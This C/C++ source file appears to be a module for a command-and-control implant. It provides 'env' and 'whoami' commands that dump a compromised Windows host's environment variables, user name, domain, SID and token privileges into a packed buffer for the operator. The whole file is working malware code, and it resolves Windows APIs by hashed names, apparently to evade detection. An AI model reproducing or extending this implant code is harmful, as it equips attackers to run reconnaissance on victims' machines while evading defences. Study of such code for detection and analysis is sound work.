#include "common.h"

#define DO_ENV 1
#define DO_WHOAMI 2

#define PARSE_ENV 201
#define PARSE_WHOAMI 202


#define ENV_ERROR 350

#define NTAPI_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)


#define CURRENT_PROCESS (HANDLE)-1

typedef LPCH(WINAPI* pGetEnvironmentStrings)();
typedef BOOL(WINAPI* pFreeEnvironmentStringsA)(LPCH env);
typedef BOOL(WINAPI* pConvertSidToStringSidA)(PSID Sid, LPSTR *StringSid);
typedef BOOL(WINAPI* pLookupAccountSidA)(LPCSTR SysName, PSID Sid, LPSTR Name, LPDWORD ccName, LPSTR RefDomain, LPDWORD ccRefDomain, PSID_NAME_USE peUse);
typedef BOOL(WINAPI* pLookupPrivilegeNameA)(LPCSTR SysName, PLUID Luid, LPSTR Name, LPDWORD ccName);
typedef DWORD(WINAPI* pGetLastError)();
typedef BOOL(WINAPI* pCloseHandle)(HANDLE hObject);
typedef NTSTATUS(NTAPI *pNtOpenProcessToken)(HANDLE hProcess, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
typedef NTSTATUS(NTAPI *pNtQueryInformationToken)(HANDLE TokenHandle, TOKEN_INFORMATION_CLASS TokenInfoClass, PVOID TokenInfo, ULONG TokenInfoLen, PULONG retLen);
typedef ULONG(NTAPI *pRtlNtStatusToDosError)(NTSTATUS Status);

SEC_B void do_env(PModule mod) {
	HMODULE k32 = mod->ModuleGetModule(HASH_STRW( L"KERNEL32.DLL" ) );
	pGetEnvironmentStrings fnGetEnvironmentStrings     = ( pGetEnvironmentStrings   )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetEnvironmentStringsA"    ) );
	pFreeEnvironmentStringsA fnFreeEnvironmentStringsA = ( pFreeEnvironmentStringsA )mod->ModuleGetProcAddress( k32, HASH_STRA( "FreeEnvironmentStringsA"   ) );

	LPCH envBlock = fnGetEnvironmentStrings();
	LPCH p = envBlock;
	if(!envBlock) {
		mod->ModulePack4( OUTPUT_MODULE_ERROR );
		mod->ModulePack4( ENV_ERROR );
		goto CLEANUP;
	}

	mod->ModulePack4(OUTPUT_NEEDS_PARSE);
	mod->ModulePack4(PARSE_ENV);

	while(*p) {
		auto len = pStrlen( p );
		mod->ModulePack4( ( INT32 )len );
		mod->ModulePackBytes( ( PBYTE )p, ( INT32 )len );
		p += len + 1;
	}
	mod->ModulePack4( END_SIG );


CLEANUP:
	if(envBlock) { fnFreeEnvironmentStringsA( envBlock ); }
	return;
}


SEC_B void do_whoami(PModule mod) {
	NTSTATUS stat;
	HANDLE hToken          			= NULL;
	PTOKEN_USER pTokenUser 			= NULL;
	PTOKEN_PRIVILEGES pTokenPrivs   = NULL;
	LPSTR SidString    			    = NULL;
	CHAR NameBuf[ 256 ];
	CHAR DomainBuf[ 256 ];
	SID_NAME_USE sidType;
	DWORD DomainLen     = sizeof(DomainBuf);
	DWORD NameLen       = sizeof(NameBuf);
	DWORD TokenUserLen  = 0;
	DWORD TokenPrivsLen = 0;


	HMODULE nt     = mod->ModuleGetModule( HASH_STRW( L"NTDLL.DLL" ) );
	HMODULE advapi = mod->ModuleGetModule( HASH_STRW( L"ADVAPI32.DLL" ) );
	HMODULE k32    = mod->ModuleGetModule( HASH_STRW( L"KERNEL32.DLL" ) );
	pNtOpenProcessToken fnNtOpenToken       = ( pNtOpenProcessToken      )mod->ModuleGetProcAddress( nt, HASH_STRA( "NtOpenProcessToken"      ) );
	pNtQueryInformationToken fnNtQueryToken = ( pNtQueryInformationToken )mod->ModuleGetProcAddress( nt, HASH_STRA( "NtQueryInformationToken" ) );
	pRtlNtStatusToDosError fnRtlNtStatusToDosError = ( pRtlNtStatusToDosError )mod->ModuleGetProcAddress( nt, HASH_STRA( "RtlNtStatusToDosError" ) );
	pGetLastError fnGetLastError = ( pGetLastError )mod->ModuleGetProcAddress( k32, HASH_STRA( "GetLastError" ) );
	pCloseHandle fnCloseHandle   = ( pCloseHandle  )mod->ModuleGetProcAddress( k32, HASH_STRA( "CloseHandle"  ) );


	stat = fnNtOpenToken( CURRENT_PROCESS, TOKEN_QUERY, &hToken );
	if( ! NTAPI_SUCCESS( stat ) ) {
		mod->ModulePack4( OUTPUT_WIN32_ERROR );
		mod->ModulePack4( ( INT32 )fnRtlNtStatusToDosError( stat ) );
		return;
	}

	fnNtQueryToken( hToken, TokenUser, NULL, 0, &TokenUserLen );
	pTokenUser = ( PTOKEN_USER )mod->ModuleAllocate(TokenUserLen);

	stat = fnNtQueryToken( hToken, TokenUser, pTokenUser, TokenUserLen, &TokenUserLen );
	if( ! NTAPI_SUCCESS( stat ) ) {
		mod->ModuleFreeMem(pTokenUser);
		fnCloseHandle( hToken );
		mod->ModulePack4( OUTPUT_WIN32_ERROR );
		mod->ModulePack4( ( INT32 )fnRtlNtStatusToDosError( stat ) );
		return;
	}

	pConvertSidToStringSidA fnConvertSidToStringSidA = (pConvertSidToStringSidA)mod->ModuleGetProcAddress(advapi, HASH_STRA( "ConvertSidToStringSidA" ) );
	pLookupAccountSidA fnLookupAccountSidA = (pLookupAccountSidA)mod->ModuleGetProcAddress(advapi, HASH_STRA( "LookupAccountSidA" ) );
	pLookupPrivilegeNameA fnLookupPrivilegeNameA = (pLookupPrivilegeNameA)mod->ModuleGetProcAddress(advapi, HASH_STRA( "LookupPrivilegeNameA" ) );
	if( ! fnConvertSidToStringSidA( pTokenUser->User.Sid, &SidString ) ) {
		mod->ModulePack4(OUTPUT_WIN32_ERROR);
		mod->ModulePack4( ( INT32 )fnGetLastError( ) );
		mod->ModuleFreeMem( pTokenUser );
		fnCloseHandle( hToken );
		return;
	}

	if( ! fnLookupAccountSidA( NULL, pTokenUser->User.Sid, NameBuf, &NameLen, DomainBuf, &DomainLen, &sidType ) ) {
		mod->ModulePack4( OUTPUT_WIN32_ERROR );
		mod->ModulePack4( ( INT32 )fnGetLastError( ) );
		mod->ModuleFreeMem( pTokenUser );
		mod->ModuleFreeMem( SidString );
		fnCloseHandle( hToken );
		return;
	}

	fnNtQueryToken( hToken, TokenPrivileges, NULL, 0, &TokenPrivsLen );
	pTokenPrivs = ( PTOKEN_PRIVILEGES )mod->ModuleAllocate( TokenPrivsLen );

	stat = fnNtQueryToken( hToken, TokenPrivileges, pTokenPrivs, TokenPrivsLen, &TokenPrivsLen );
	if( ! NTAPI_SUCCESS( stat ) ) {
		mod->ModuleFreeMem(pTokenUser);
		mod->ModuleFreeMem(pTokenPrivs);
		mod->ModuleFreeMem(SidString);
		fnCloseHandle( hToken );
		
		mod->ModulePack4( OUTPUT_WIN32_ERROR );
		mod->ModulePack4( ( INT32 )fnRtlNtStatusToDosError( stat ) );
		return;
	}

	mod->ModulePack4( OUTPUT_NEEDS_PARSE );
	mod->ModulePack4( PARSE_WHOAMI );
	mod->ModulePack4( ( INT32 )NameLen);
	mod->ModulePackBytes( ( PBYTE )NameBuf, ( INT32 )NameLen );
	mod->ModulePack4( ( INT32 )DomainLen );
	mod->ModulePackBytes( ( PBYTE )DomainBuf, ( INT32 )DomainLen );
	mod->ModulePack4( ( INT32 )pStrlen( SidString ) );
	mod->ModulePackBytes( ( PBYTE )SidString, ( INT32 )pStrlen( SidString ) );

	for(DWORD i = 0; i < pTokenPrivs->PrivilegeCount; i++) {
		LUID_AND_ATTRIBUTES Privs = pTokenPrivs->Privileges[i];
		CHAR PrivName[256] = {0};
		DWORD PrivNameLen = sizeof(PrivName);
		DWORD PrivStatus  = 0;

		if( ! fnLookupPrivilegeNameA( NULL, &Privs.Luid, PrivName, &PrivNameLen ) ) {
			continue;
		}
		if     ( Privs.Attributes & SE_PRIVILEGE_REMOVED )            { PrivStatus = 0; }
		else if( Privs.Attributes & SE_PRIVILEGE_ENABLED )            { PrivStatus = 1; }
		else if( Privs.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT ) { PrivStatus = 2; }
		else { PrivStatus = 3; }

		mod->ModulePack4( ( INT32 )PrivNameLen );
		mod->ModulePackBytes( ( PBYTE )PrivName, ( INT32 )PrivNameLen);
		mod->ModulePack4( ( INT32 )PrivStatus);
	}
	mod->ModulePack4( END_SIG );


	if( pTokenUser )  { mod->ModuleFreeMem( pTokenUser );  }
	if( pTokenPrivs ) { mod->ModuleFreeMem( pTokenPrivs ); }
	if( SidString )   { mod->ModuleFreeMem( SidString );   }
	if( hToken)       { fnCloseHandle( hToken );           }
	return;
}


 extern "C" SEC_B void run(PModule mod, INT32 CommandCode) {
 	switch (CommandCode) {
	case DO_ENV:
		do_env(mod);
		break;
	case DO_WHOAMI:
		do_whoami(mod);
		break;
	}
 }